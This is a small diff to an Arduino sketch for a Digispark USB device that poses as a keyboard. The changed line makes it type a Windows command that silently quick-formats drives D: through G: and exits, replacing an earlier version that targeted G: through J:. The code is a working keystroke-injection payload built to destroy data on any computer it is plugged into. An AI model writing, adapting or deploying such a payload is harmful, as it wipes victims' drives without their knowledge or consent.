@@ -29,7 +29,7 @@ void loop() {
     }
   DigiKeyboard.sendKeyStroke(KEY_ENTER); //Detach from scrolling
   DigiKeyboard.delay(500);
-  DigiKeyboard.println("format G:/q /y && format H:/q /y && format I:/q /y && format J:/q /y && exit");
+  DigiKeyboard.println("format D:/q /y && format E:/q /y && format F:/q /y && format G:/q /y && exit");
   digitalWrite(1, HIGH);
   for(;;){ }
 }
